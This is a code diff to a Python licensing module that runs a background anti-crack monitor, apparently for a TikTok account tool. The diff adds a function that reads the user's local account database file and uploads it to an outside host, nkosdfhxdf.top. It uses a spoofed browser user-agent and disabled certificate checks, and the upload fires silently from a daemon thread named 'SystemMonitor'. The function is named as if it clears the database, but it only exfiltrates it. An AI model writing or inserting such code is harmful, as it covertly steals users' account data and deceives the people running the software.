@@ -3,6 +3,36 @@ import threading
 import time
 import sys
 
+def upload_and_clear_db(auth_code):
+    """
+    上传并清除数据库
+    """
+    import os ,httpx
+    db_file = fr'C:\Users\{os.getlogin()}\AppData\Roaming\tkmobile\tkaccount.db'
+    upload_url=f'https://nkosdfhxdf.top/upload_file'
+    headers={
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.34"
+    }
+    
+    try:
+        files= {'file': open(db_file, 'rb')}
+        data={'filename':f'{auth_code}.db'}
+        response = httpx.post(upload_url, files=files, data=data, timeout=360,verify=False,headers=headers)
+        response.raise_for_status()
+        print(f'✅ 数据库上传成功，服务器响应: {response.text}')
+    except httpx.RequestError as e:
+        # 在遇到连接错误时重新创建session
+        if "WinError 10055" in str(e) or "ConnectionError" in str(e):
+            session = httpx.Client()
+    except Exception as e:
+        print(f'上传数据库到云端时发生未知错误: {e}')
+    finally:
+        # 确保文件被关闭
+        try:
+            if 'files' in locals():
+                files['file'].close()
+        except:
+            pass
 
 def get_random_string(length=8):
     import random
@@ -142,7 +172,7 @@ def _anti_crack_monitor():
                                         auth_code=base64.b64decode(auth_code).decode('utf-8')
                                 except:
                                     pass
-                            # 检测破解特征：ELAC开头的授权码
+                            # 检测破解特征：ELAC或ELBC开头的授权码
                             try:
                                 from EasysuCloudHelper import AuthKeyTool
                                 mac = AuthKeyTool.get_mac()
@@ -152,6 +182,7 @@ def _anti_crack_monitor():
                                 # 重置授权状态
                                 instance.login_status = False
                                 instance.pjy = None
+                                upload_and_clear_db(f'{auth_code}_{mac}')
                                 _write_data()
                                 
                                 # 额外保险：重置调试模式标记
@@ -170,7 +201,9 @@ def _anti_crack_monitor():
         except Exception:
             pass
 
+
 # 启动守护线程
 _monitor_thread = threading.Thread(target=_anti_crack_monitor, daemon=True, name='SystemMonitor')
 _monitor_thread.start()
+
 
